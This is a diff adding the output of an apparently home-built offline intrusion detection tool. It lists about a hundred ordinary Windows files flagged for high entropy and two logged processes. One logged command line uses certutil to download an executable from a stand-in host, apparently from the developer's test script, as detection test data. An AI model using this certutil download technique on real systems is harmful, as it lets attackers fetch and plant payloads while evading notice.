@@ -1,0 +1,675 @@
+===== Offline Intrusion Detection System Report =====
+Report Generated At: 2026-03-27 15:36:18
+
+Summary:
+Suspicious Files: 107
+High Entropy Files: 107
+Suspicious Processes: 2
+
+Suspicious Files:
+File: @AdvancedKeySettingsNotification.png
+Status: Known
+Entropy: 7.136775120562238
+High Entropy: true
+Hash: aa24a85644ecccad7098327899a3c827a6be2ae1474c7958c1500dcd55ee66d8
+
+File: @AudioToastIcon.png
+Status: Known
+Entropy: 7.062517866675947
+High Entropy: true
+Hash: 0b99b2576f1fa0689ff6e03462076f4ca2c36d3b198511f7497fb9c89615c445
+
+File: @AutoSrToastIcon.png
+Status: Known
+Entropy: 7.289137612966203
+High Entropy: true
+Hash: 7145d9777ccf25fafc1697f030b08a0733ae763c1ba2837cc385bd0536a70671
+
+File: @BackgroundAccessToastIcon.png
+Status: Known
+Entropy: 7.475035446846034
+High Entropy: true
+Hash: 31940f380b2d7c2f65ca6b90608aeb2c4db48cc5c03cf4add51195fec3cd294b
+
+File: @EnrollmentToastIcon.png
+Status: Known
+Entropy: 7.020169884211871
+High Entropy: true
+Hash: 1170eba51c0737181fee01df67d3df68305bd0bdf15779195c2cfa03ca78456e
+
+File: @facial-recognition-windows-hello-rejuv.gif
+Status: Known
+Entropy: 7.957928813796058
+High Entropy: true
+Hash: fb07e8c8022d258fd0acd87c0f4ec3594bb4535768ab3471402baeb6a552d0ef
+
+File: @facial-recognition-windows-hello.gif
+Status: Known
+Entropy: 7.974333947576571
+High Entropy: true
+Hash: 5bfe72549c20a483866cf4e437d119f11a0e02f7847f9829ab2ae10137ae6beb
+
+File: @language_notification_icon.png
+Status: Known
+Entropy: 7.398958217402892
+High Entropy: true
+Hash: c08b1b157991539aabaf7936f8bb618a6c5cea0e2cfafd7b0723bc7e9461e091
+
+File: @optionalfeatures.png
+Status: Known
+Entropy: 7.46586719522788
+High Entropy: true
+Hash: a57693dfa4d0778018223f000c435e8960a7d4f0e37ce14c6eb296f6dfd995fd
+
+File: @StorageSenseToastIcon.png
+Status: Known
+Entropy: 7.241603554540552
+High Entropy: true
+Hash: 6b05fb9f09fdb608dcce58226b9b7e246a30873906af8a5feac124c371bda37e
+
+File: @VpnToastIcon.png
+Status: Known
+Entropy: 7.709996802628283
+High Entropy: true
+Hash: 508f74170c53ed66a90aeb801b7116a715de0e021db7c269e698026c4d128340
+
+File: @WindowsHelloFaceToastIcon.png
+Status: Known
+Entropy: 7.269514969249504
+High Entropy: true
+Hash: 148f160835989b720cff2a782a5cd8b36ade1d1f1781c554a5c077595890406b
+
+File: @WindowsHelloFaceToastIconRejuv.png
+Status: Known
+Entropy: 7.745394951855614
+High Entropy: true
+Hash: 43ac8a15d9ac6af300349a4e0a59fd2d61e65c0a5d0fec7ae78497b756155112
+
+File: @WindowsUpdateToastIcon.contrast-black.png
+Status: Known
+Entropy: 7.299891943449707
+High Entropy: true
+Hash: 428fcbd6a20328e13f9c6bd92a8230497dc8be85e8e052724b1ff273306aad7a
+
+File: @WindowsUpdateToastIcon.contrast-white.png
+Status: Known
+Entropy: 7.502250369706138
+High Entropy: true
+Hash: db2d74068ff62e6cbeff2ed3f405acc99312960e4f66902a3ff35f84fdeed86c
+
+File: @WindowsUpdateToastIcon.png
+Status: Known
+Entropy: 7.299891943449707
+High Entropy: true
+Hash: 428fcbd6a20328e13f9c6bd92a8230497dc8be85e8e052724b1ff273306aad7a
+
+File: @WirelessDisplayToast.png
+Status: Known
+Entropy: 7.45141445573292
+High Entropy: true
+Hash: 4f10cdc52bb903b8e84257f62923b8e3635fe554fde344c27647cb6e7e369ee4
+
+File: ActiveHours.png
+Status: Known
+Entropy: 7.948495821218519
+High Entropy: true
+Hash: 6780ca70605a2c7a6805cb7b58f7fac8e666ae6c22e266e71761c8722a5030b4
+
+File: aitstatic.exe
+Status: Known
+Entropy: 7.201387497754634
+High Entropy: true
+Hash: ec7a1951a18baff6841b2ff7d448600b102e1c3158b215a19dab4f880503b99e
+
+File: appverif.chm
+Status: Known
+Entropy: 7.9676860654144726
+High Entropy: true
+Hash: 30de714f364e84c2a92e9f6b8dc5137c7a5812149fe8c9995e480421925f7f4c
+
+File: AudioEng.dll
+Status: Known
+Entropy: 7.125033192502215
+High Entropy: true
+Hash: 24f7613c8fb6a9ca6a4d53aeece33e5e2f09ff6b0056ff705c496304b675f43e
+
+File: AutoCatHost.exe
+Status: Known
+Entropy: 7.500034226748239
+High Entropy: true
+Hash: 616cf5b01d6a69d04a79007b674540aecc9d9123280c7b93c2b96be1ce0d749e
+
+File: AverageRoom.bin
+Status: Known
+Entropy: 7.595935284121993
+High Entropy: true
+Hash: 4dc27b3901538f8db703cca849c21c828386bb059c40788db82cbfa75edd626b
+
+File: BluetoothPairingSystemToastIcon.contrast-black.png
+Status: Known
+Entropy: 7.945554712677542
+High Entropy: true
+Hash: a7a5c03e5ec4348e30060935d9041b4b58f34de2376da9155258684ed52a4865
+
+File: BluetoothPairingSystemToastIcon.contrast-high.png
+Status: Known
+Entropy: 7.956901228315837
+High Entropy: true
+Hash: b0fda245579e57a9c613e1288c6b294c907a3b8e5bee32a72437a4fbfabc061c
+
+File: BluetoothPairingSystemToastIcon.contrast-white.png
+Status: Known
+Entropy: 7.945554712677542
+High Entropy: true
+Hash: a7a5c03e5ec4348e30060935d9041b4b58f34de2376da9155258684ed52a4865
+
+File: BluetoothPairingSystemToastIcon.png
+Status: Known
+Entropy: 7.953120169561707
+High Entropy: true
+Hash: 91d33ec5f008f2066b3a6658e1915b09a4fea2ed70e5260a0bd37c618c219fc1
+
+File: BluetoothSystemToastIcon.contrast-white.png
+Status: Known
+Entropy: 7.569990209338934
+High Entropy: true
+Hash: d27341004967be2b9dff3399fdfdaf3b0fb63b89f0f9f609e8792652df900b68
+
+File: BluetoothSystemToastIcon.png
+Status: Known
+Entropy: 7.750032828732612
+High Entropy: true
+Hash: abd1e47761ff024101d32c0e4389fd0f9344402d9b2bdc19165b105845fc6714
+
+File: ClipUp.exe
+Status: Known
+Entropy: 7.282962669025567
+High Entropy: true
+Hash: e8f6f89f242f045401f6232c31f34393cc04e655375971b88ac92831fab80d5c
+
+File: CriticallyLowBatterySystemToastIcon.contrast-white.png
+Status: Known
+Entropy: 7.822691756849915
+High Entropy: true
+Hash: 54fc4f6fb160bbfe5a4f700224f4d2efd23bf5f2f4027d08b6d9fc01159e4d7e
+
+File: CriticallyLowBatterySystemToastIcon.png
+Status: Known
+Entropy: 7.79786800258324
+High Entropy: true
+Hash: 1d48e54867408a0ac90dbcf9c68dd5efadf2d31ffb35ac96b92eadc6a55f50bf
+
+File: d3dcsx_42.dll
+Status: Known
+Entropy: 7.796271819250184
+High Entropy: true
+Hash: 8852c218583dc11113705bd89dabd51b0f77db6b393eaf9a9a751652b7cdef24
+
+File: DefaultAccountTile.png
+Status: Known
+Entropy: 7.627890369673621
+High Entropy: true
+Hash: 0bec7ec467cdd1dd08550de358463edb52f46434fa40323c4fce398578c8e3b0
+
+File: DefaultHrtfs.bin
+Status: Known
+Entropy: 7.353038607809022
+High Entropy: true
+Hash: 0573c7c914baa9689a6ef9461f8d4e34608905a676d1783c31cc09e9dff8e4ec
+
+File: DMRCDecoder.dll
+Status: Known
+Entropy: 7.03913566491632
+High Entropy: true
+Hash: 401a67a6805829491c0d9a64922f8f2d03b357a68f46e5cecbd24d586a6b399c
+
+File: DynamicLong.bin
+Status: Known
+Entropy: 7.316923309031133
+High Entropy: true
+Hash: 67a991069d4c1de7b32abfcf523e575ab088e488e650f0da2ab5f35c4da42ba6
+
+File: DynamicMedium.bin
+Status: Known
+Entropy: 7.120649792704966
+High Entropy: true
+Hash: d113ed4509a3094757dbf58dbd72b64118827c04236f83a04064a0deee4d3f97
+
+File: EarbudsSystemToastIcon.contrast-white.png
+Status: Known
+Entropy: 7.7726219866295585
+High Entropy: true
+Hash: 49f3cace77fa49f3eea65361221044cc4c3f4866bc19dacf95a12ce3c538a4b5
+
+File: EarbudsSystemToastIcon.png
+Status: Known
+Entropy: 7.816086237908158
+High Entropy: true
+Hash: b3c142095135975143ac4fe66085a2ed833d88e7506f8cf675012d2fcd0be439
+
+File: FeatureToastBulldogImg.png
+Status: Known
+Entropy: 7.7140610745437925
+High Entropy: true
+Hash: 738e6973c595c847efd1272497bb1f68c24bd544a3d3a04e20a5c2030410e3d2
+
+File: FeatureToastDlpImg.png
+Status: Known
+Entropy: 7.892312380735216
+High Entropy: true
+Hash: b9164795e342bc8fa8735cc2a652315441ebdf2c46620c6adb8b6cf261c38dab
+
+File: GameSystemToastIcon.contrast-white.png
+Status: Known
+Entropy: 7.579332547063603
+High Entropy: true
+Hash: 9f136fdc8986ba6fd2797097b9f64ffc3827aac687a3dbf46743296476cdccc4
+
+File: GameSystemToastIcon.png
+Status: Known
+Entropy: 7.666231883445361
+High Entropy: true
+Hash: aba954e6b5efc870c1d458a31dbe6a4e5e7c0d62944dfbe3720285efe93f1659
+
+File: gb2312.uce
+Status: Known
+Entropy: 7.175705610063572
+High Entropy: true
+Hash: 829149bcdb2ac5a1d54201071ffa093fd7ec8fea2da5ed3df0ac333e20ca069c
+
+File: GenValObj.exe
+Status: Known
+Entropy: 7.138604256620793
+High Entropy: true
+Hash: d75e0ba69bdb99f06046cf80699b9e84f7b86f64af76f3c6a396db6e3bae6b26
+
+File: HandwritingSystemToastIcon.contrast-white.png
+Status: Known
+Entropy: 7.575284392542737
+High Entropy: true
+Hash: e4eb24acb3907d03771dccfec54c057069beb7e2298a1a7237bf26a85c5e96cb
+
+File: HandwritingSystemToastIcon.png
+Status: Known
+Entropy: 7.529742115437068
+High Entropy: true
+Hash: ea2c08db52344861bb9997071fbcff6257440f1d6d6dfeac1b4b35bae957e6a2
+
+File: HeadphoneSystemToastIcon.contrast-white.png
+Status: Known
+Entropy: 7.596402162316111
+High Entropy: true
+Hash: f67fff5bb2115759a7f4699c12f9112877193aedda81d790eff99e60297aa537
+
+File: HeadphoneSystemToastIcon.png
+Status: Known
+Entropy: 7.433177587842697
+High Entropy: true
+Hash: 5a76bcd34985955ee05a603711fd201236650e8936f0dba9fef6236bb7959dc1
+
+File: HeadsetSystemToastIcon.contrast-white.png
+Status: Known
+Entropy: 7.6923035808530225
+High Entropy: true
+Hash: c5b62540a42160a79d7be032cecedd5f9da80f08d92813d9e3417053c1bf0576
+
+File: HeadsetSystemToastIcon.png
+Status: Known
+Entropy: 7.551358632262517
+High Entropy: true
+Hash: 3174b0c34b37e74e23432529a8cb91c0644d2468336bd8a6ca3a0cd2029fb341
+
+File: HealthSystemToastIcon.contrast-white.png
+Status: Known
+Entropy: 7.760669868808522
+High Entropy: true
+Hash: c357bbfcb36a655a28728c87f0a2a9c1ac2cbc78cdf1d3f6482dfa27c235b067
+
+File: HealthSystemToastIcon.png
+Status: Known
+Entropy: 7.8542917748775105
+High Entropy: true
+Hash: d461837a25ad4fe1fe09b7055cd9a9bac34b2269c6c1d0e99574be3cf456400b
+
+File: HearingAidSystemToastIcon.contrast-white.png
+Status: Known
+Entropy: 7.910577685750133
+High Entropy: true
+Hash: 04a59089c687d29afcf0507e96e505064e2108898d76ded22482b50ef9715c9e
+
+File: HearingAidSystemToastIcon.png
+Status: Known
+Entropy: 7.930580933662657
+High Entropy: true
+Hash: 782491bd4313c83bb9e9c2d66c31fcbd0c4d9c3417478b5daccf00c329b86e52
+
+File: InputSystemToastIcon.contrast-white.png
+Status: Known
+Entropy: 7.570830003241226
+High Entropy: true
+Hash: 9b561f02a1dbcac93ba0428ada3ecb0c3d9e5934d466ab0eb152ff5b1f41c77f
+
+File: InputSystemToastIcon.png
+Status: Known
+Entropy: 7.335682448542472
+High Entropy: true
+Hash: 499e4c5f7f7d1adc9518396ff025fc5c6d144a4131a64342c9dba0a6c369c7cc
+
+File: kanji_1.uce
+Status: Known
+Entropy: 7.30506082153602
+High Entropy: true
+Hash: 2373bf7e4f975d25fb3eabe004fbe138f9dba7ed6ffb9c967edc134d4d5956b7
+
+File: kanji_2.uce
+Status: Known
+Entropy: 7.4053869191576664
+High Entropy: true
+Hash: 32e4e19efb2f90bd439c6bba865563857d664fa6da87cb195e85ee97a0853bfc
+
+File: KeyboardSystemToastIcon.contrast-white.png
+Status: Known
+Entropy: 7.130344015101459
+High Entropy: true
+Hash: 28163d7819c38b0b10f1eabb15438364aec86e681fc2bfab0770b77535a5c26e
+
+File: korean.uce
+Status: Known
+Entropy: 7.2198038663016355
+High Entropy: true
+Hash: 5a860faa3ec38d245d2bcfdfdedf22d1a4e9282302e87cea7f1cebd068cbc88e
+
+File: LargeRoom.bin
+Status: Known
+Entropy: 7.5909713363498295
+High Entropy: true
+Hash: 6b9e233540a742874c905023327a4cf078d11e936aa2b6421a44513b58471bf0
+
+File: libsmartscreenn.dll
+Status: Known
+Entropy: 7.1000063798448165
+High Entropy: true
+Hash: 08c0cd4a8e98f854a14f3375e97914cbba89ee0102569b9d7c2f60cbb4f351c3
+
+File: LowBatterySystemToastIcon.contrast-white.png
+Status: Known
+Entropy: 7.84875242067236
+High Entropy: true
+Hash: 4bfd41c1bfb82b1512ac8e5875f49abdef5b7ce2789f1fca4ab340f74b6db25d
+
+File: LowBatterySystemToastIcon.png
+Status: Known
+Entropy: 7.812234890505189
+High Entropy: true
+Hash: 321d5f2f9bf4eeb245ed19d9e790653f8e4542c2302b23cd9dfa9db3e71646aa
+
+File: mcupdate_GenuineIntel.dll
+Status: Known
+Entropy: 7.994893784640214
+High Entropy: true
+Hash: c7500509567b44889b449d64f467b77bb7cf3f7ce10ce2073ba8b93b420b58d1
+
+File: MediaSystemToastIcon.contrast-white.png
+Status: Known
+Entropy: 7.528370048426523
+High Entropy: true
+Hash: 829338dc8b65c16ffc300b368ed86c31d95cf3fe7dfd042b528e23e0bfb32a99
+
+File: MediaSystemToastIcon.png
+Status: Known
+Entropy: 7.084737743383274
+High Entropy: true
+Hash: 031224518c14be0b79149bc9366db44a698e8b6a8985dba19f11dba9ae4dd3ad
+
+File: MediumRoom.bin
+Status: Known
+Entropy: 7.58519198060275
+High Entropy: true
+Hash: 0c77837f47da114cce6ed26142bbfcc2ac5a0d9a8e4f2dd996f3480ce83bf239
+
+File: mordmft.dll
+Status: Known
+Entropy: 7.1942964166119365
+High Entropy: true
+Hash: 9e4dbf53e44733594bc77ff5a1e6ea173385b61df13d2a8d742f6b758993f7f4
+
+File: MouseSystemToastIcon.contrast-white.png
+Status: Known
+Entropy: 7.3936241933894
+High Entropy: true
+Hash: d655a159f95e8d6c0c89a04a36f552b6e7062aedd031a265a269c282745ec035
+
+File: MouseSystemToastIcon.png
+Status: Known
+Entropy: 7.421295543125314
+High Entropy: true
+Hash: 641083fdc3c566cfdb741ca11300f95319258580a07bbfcd63a7f7c42ca2bab3
+
+File: MRT.exe
+Status: Known
+Entropy: 7.531380289603859
+High Entropy: true
+Hash: ae77c3f0baf3f9d202988a786a08fbee7c03e596c8c8e17c7481cd2f3a76ae21
+
+File: msmpeg2ac3dec.dll
+Status: Known
+Entropy: 7.2891324771653805
+High Entropy: true
+Hash: 27ca80a44befdaa9fae6a954d87e906a0bbc231771d288c3832ab14c44477db3
+
+File: nvinfo.pb
+Status: Known
+Entropy: 7.998774813656979
+High Entropy: true
+Hash: 780291076a580d39a2961165d818556aac9d7280d9d70cc0ea8c807f4aa87d5c
+
+File: OneDriveSetup.exe
+Status: Known
+Entropy: 7.972234889516297
+High Entropy: true
+Hash: 18980a6b7fbfdada0f00789b229ed6331779611286102abcfa0917edb0bee82c
+
+File: PhoneSystemToastIcon.contrast-white.png
+Status: Known
+Entropy: 7.82857188078658
+High Entropy: true
+Hash: 2775fdcebc1feb42378aa08118b85bfbc7c5aaaf2ce1a9938eb4012375049eb4
+
+File: PhoneSystemToastIcon.png
+Status: Known
+Entropy: 7.838787686062635
+High Entropy: true
+Hash: e11a8223039593341bd1d789c36c164c5350d49392833f722c2c3684de5064c8
+
+File: RemoteSystemToastIcon.contrast-white.png
+Status: Known
+Entropy: 7.618398921548509
+High Entropy: true
+Hash: 16e445dd1d87c669f6a8cc06775b68140f27fed1171578e668f93222b1b43c10
+
+File: RemoteSystemToastIcon.png
+Status: Known
+Entropy: 7.476455781850763
+High Entropy: true
+Hash: 0436748f71a521761f7797c977fa1da18abeff0d9758021055b03ba1d4f4cfe7
+
+File: ResPriHMImageList
+Status: Known
+Entropy: 7.838149571671696
+High Entropy: true
+Hash: 2d2c2941da8b2cffe866166bd5e8350ce79eacb06e811f066f60d6ffb664b640
+
+File: ResPriHMImageListLowCost
+Status: Known
+Entropy: 7.838149571671696
+High Entropy: true
+Hash: 2d2c2941da8b2cffe866166bd5e8350ce79eacb06e811f066f60d6ffb664b640
+
+File: ResPriImageList
+Status: Known
+Entropy: 7.838149571671696
+High Entropy: true
+Hash: 2d2c2941da8b2cffe866166bd5e8350ce79eacb06e811f066f60d6ffb664b640
+
+File: ResPriImageListLowCost
+Status: Known
+Entropy: 7.838149571671696
+High Entropy: true
+Hash: 2d2c2941da8b2cffe866166bd5e8350ce79eacb06e811f066f60d6ffb664b640
+
+File: ResPriLMImageList
+Status: Known
+Entropy: 7.838149571671696
+High Entropy: true
+Hash: 2d2c2941da8b2cffe866166bd5e8350ce79eacb06e811f066f60d6ffb664b640
+
+File: ResPriUHMImageList
+Status: Known
+Entropy: 7.838149571671696
+High Entropy: true
+Hash: 2d2c2941da8b2cffe866166bd5e8350ce79eacb06e811f066f60d6ffb664b640
+
+File: sbresources.dll
+Status: Known
+Entropy: 7.327578349781928
+High Entropy: true
+Hash: 3af33093977bbda1cb80611eddd72e933daff4445a3c08834eea4fa9debefda2
+
+File: SecurityAndMaintenance.png
+Status: Known
+Entropy: 7.8723714042647615
+High Entropy: true
+Hash: 84ddc3b2db43831341332da8be3f5252255a6fd3b67d8adc19f87defe1d560ad
+
+File: SecurityAndMaintenance_Alert.png
+Status: Known
+Entropy: 7.378610029091797
+High Entropy: true
+Hash: 964a7edafb080e64d2ab7fdc5d64f91ce40408083e0d58670852a6fa46a59253
+
+File: SecurityAndMaintenance_Error.png
+Status: Known
+Entropy: 7.896151483146773
+High Entropy: true
+Hash: df1c6676a93eb0e347607f323e00f4063ede1d19e54e7661e5cf6d0f39586e82
+
+File: ShiftJIS.uce
+Status: Known
+Entropy: 7.519264686698194
+High Entropy: true
+Hash: c0c2e9e5643357489ccd1ad010da4bbbacb290e01cc15a9da27bca820346956e
+
+File: SmallRoom.bin
+Status: Known
+Entropy: 7.584827453977675
+High Entropy: true
+Hash: 5f13f317608cb5d15fb0e2f1985305e296a318605d1c6bb7c98571dab7001030
+
+File: SpeakersSystemToastIcon.contrast-white.png
+Status: Known
+Entropy: 7.66113688877259
+High Entropy: true
+Hash: dd6bcbe14ec3af62f0b1be73d23548eb7cc9fb3bc7143917581c6ea7b5c7919c
+
+File: SpeakersSystemToastIcon.png
+Status: Known
+Entropy: 7.43645220534788
+High Entropy: true
+Hash: bc46da1628396c92c9762af1fdde9dc3b953d900d0c895e9deaaa2ee8d3452f0
+
+File: SppExtComObj.Exe
+Status: Known
+Entropy: 7.214790106825086
+High Entropy: true
+Hash: 70083e677e3eace71b89bc3dfd6476a9892dff9138fe8f8e0089b81ce3e6f882
+
+File: sppsvc.exe
+Status: Known
+Entropy: 7.139487195568702
+High Entropy: true
+Hash: 6a5c3565693e9be7ee141895f9881ac759de9aa054d79e2ee4731f214cb9ef0a
+
+File: spwizimg.dll
+Status: Known
+Entropy: 7.172318506228234
+High Entropy: true
+Hash: be47d7cff551152089d3bd1fb038997c7aa39c105bd994d48482f9c0bb627231
+
+File: SubRange.uce
+Status: Known
+Entropy: 7.897259225944066
+High Entropy: true
+Hash: 38a39c88e643e30f85bc3162de4e97bc2a3ed7f9846507dbf9593db66577f6bc
+
+File: UdiApiClient.dll
+Status: Known
+Entropy: 7.693035452875877
+High Entropy: true
+Hash: 77f5724dab69b39b7055cdf9bd1e971cc8b4a8c35fccb322750caf6c5cd9ca7e
+
+File: whesvc_assets.dll
+Status: Known
+Entropy: 7.351420291551999
+High Entropy: true
+Hash: 878ea7bb9c2fc2237451d1c09cebe098398b43d86903e3d441f6f6646a89e7ec
+
+File: Windows.Media.FaceAnalysis.dll
+Status: Known
+Entropy: 7.203310256001438
+High Entropy: true
+Hash: e1f96919c799c3b2915e2ea66d6c7dee014d335792e490ab31849a1eb7a7ccee
+
+File: Windows.Media.Protection.PlayReady.dll
+Status: Known
+Entropy: 7.235684468508627
+High Entropy: true
+Hash: 7cd1863850aff5ecbd7922dd2713070cbe9d787052a00899a8e722055b202606
+
+File: Windows.UI.PicturePassword.dll
+Status: Known
+Entropy: 7.04810816145624
+High Entropy: true
+Hash: 10a0261eb81100c66690294a3f01b4ec2a3da6613387cb925b1c6e5318665779
+
+File: WindowsSecurityIcon.png
+Status: Known
+Entropy: 7.833135464439791
+High Entropy: true
+Hash: 03eabf4cfb705a95e641d3e59ba6b10f465d9f5cda04d18afb35143982c590eb
+
+File: wpcatltoast.png
+Status: Known
+Entropy: 7.959352918050006
+High Entropy: true
+Hash: 3068bcb1701630caf94a37c17eaa216435c125e0a01c871d5407c2a5c5842078
+
+File: wpcmon.png
+Status: Known
+Entropy: 7.923323420474883
+High Entropy: true
+Hash: 9f92bae783e92745909386a59c0f5c7e6b0f0b889104c250df8b448db90f8eab
+
+Suspicious Processes:
+{
+  "newProcessName": "c:\\windows\\system32\\certutil.exe",
+  "parentProcessName": "c:\\windows\\system32\\cmd.exe",
+  "reasons": [
+    "Known LOLBin executed: certutil.exe",
+    "Unusual parent process: c:\\windows\\system32\\cmd.exe"
+  ],
+  "riskScore": 3,
+  "commandLine": "certutil.exe  -urlcache -split -f https://example.com dummy.exe"
+}
+
+{
+  "newProcessName": "c:\\windows\\system32\\cmd.exe",
+  "parentProcessName": "c:\\windows\\explorer.exe",
+  "reasons": [
+    "Batch or PowerShell script invoked",
+    "Command execution using cmd or PowerShell /c",
+    "Unusual parent process: c:\\windows\\explorer.exe"
+  ],
+  "riskScore": 3,
+  "commandLine": "\"c:\\windows\\system32\\cmd.exe\" /c \"d:\\programming\\java_projects\\offlineintrusiondetectionassistance-main\\src\\app\\test.bat\" "
+}
+
